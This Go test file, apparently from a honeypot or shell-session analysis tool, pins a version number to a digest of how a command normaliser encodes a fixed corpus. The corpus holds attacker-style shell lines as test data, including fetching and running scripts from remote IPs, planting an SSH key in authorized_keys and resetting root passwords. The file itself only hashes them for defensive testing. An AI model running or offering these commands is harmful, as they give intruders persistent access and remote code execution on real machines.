package script

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"maps"
	"slices"
	"strings"
	"testing"
)

// versionPin ties the normaliser's observable output to Version. The digest
// covers, for a fixed hostile corpus, every value a stored script keeps:
// the encoding, Display, CommandCount, Distinctive and len(Tokens), plus
// the constants that shape tokens and families. If this test fails:
//
//   - you changed an encoding or one of those values: bump script.Version,
//     extend its history comment, then set versionPin to the new Version and
//     the digest the failure prints;
//   - you bumped Version: set versionPin to match.
//
// Never update only the digest: without a bump, stored sessions and new
// sessions of one script fingerprint differently forever.
var versionPin = struct {
	version int
	digest  string
}{4, "a6769d1637970776e4d27d7c2edf780e175ed249971337c27faf70b881844e79"}

var versionCorpus = []string{
	`uname -s -v -n -r -m`,
	`cd /tmp; wget http://1.2.3.4/x.sh; sh x.sh`,
	`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC/47d8xbCuUjYsBrxtmLjL4FDUe3BPIemNktjPY mdrfckr" >> .ssh/authorized_keys`,
	`echo "root\ndp75z0biqzBE\ndp75z0biqzBE" | passwd`,
	"echo \"root:123456789\nx\r\" | chpasswd; echo deadbeefdeadbeefdeadbeef",
	`curl -s 10.0.0.9:8080/a|bash; chmod 777 /tmp/kxhqwe; /tmp/kxhqwe`,
	`uname -a 2>&1; whoami >/dev/null 2>&1; 0</dev/null id; x >| f; y 3<>g`,
	`nice -n 5 python3 x; sudo -u root -- wget x; timeout -s 9 30 env A=1 stdbuf -oL nohup busybox ls; sudo --weird python3`,
	`echo "<url>" '<key>' "a<b http://x/y>c"`,
	`> $(evil) python3; 2>/tmp/$(date) wget x; >& f id; <&0 id; id 2>&-`,
	"cat <<\\EOF > /tmp/a.sh\nwget http://1.1.1.1/a; chmod +x a\nEOF\nsh /tmp/a.sh; rm -f /tmp/a.sh",
	"cat <<-\"E O F\" <<B\n\tbody\n\tE O F\nb\nB\nid",
	"<<EOF python3 x\n" + strings.Repeat("y", 5000) + "\nEOF",
	"{ id; w; }; if id; then 'ls'; fi; for i in 1; do \"wget\" x; done; [[ -f x ]]; case a in b) id;; esac",
	"echo `wget http://x/y`; echo `cat /tmp/kxq`",
	"\x00\xff'\"\x1e\x1f 2>&1 &>>x",
	strings.Repeat("a ; ", 400),
}

func TestVersionPinsEncoding(t *testing.T) {
	h := sha256.New()
	fmt.Fprintf(h, "consts %v %v %v %v\n", FamilyThreshold, MaxDistanceTokens, minLengthRatio, MaxHeredocBodyBytes)
	for _, m := range []map[string]bool{recon, reserved, noProgram} {
		fmt.Fprintf(h, "words %q\n", slices.Sorted(maps.Keys(m)))
	}
	for _, name := range slices.Sorted(maps.Keys(wrappers)) {
		fmt.Fprintf(h, "wrapper %s %+v\n", name, *wrappers[name]) // fmt sorts map keys
	}
	var lines []string
	for _, s := range versionCorpus {
		enc := EncodeLine(s)
		cmds := Split(Join([]string{enc}))
		fmt.Fprintf(h, "%q %q %d %v %d\n", enc, Display(enc, 120), CommandCount(cmds), Distinctive(cmds), len(Tokens(enc)))
		lines = append(lines, enc)
	}
	all := Join(lines)
	fmt.Fprintf(h, "script %s %d\n", Fingerprint(all), len(Tokens(all)))
	got := hex.EncodeToString(h.Sum(nil))
	switch {
	case Version != versionPin.version:
		t.Fatalf("script.Version is %d but versionPin says %d: set versionPin to {%d, %q}", Version, versionPin.version, Version, got)
	case got != versionPin.digest:
		t.Fatalf("the normaliser's output changed without a script.Version bump: bump script.Version, extend its history, and set versionPin to {Version, %q}", got)
	}
}
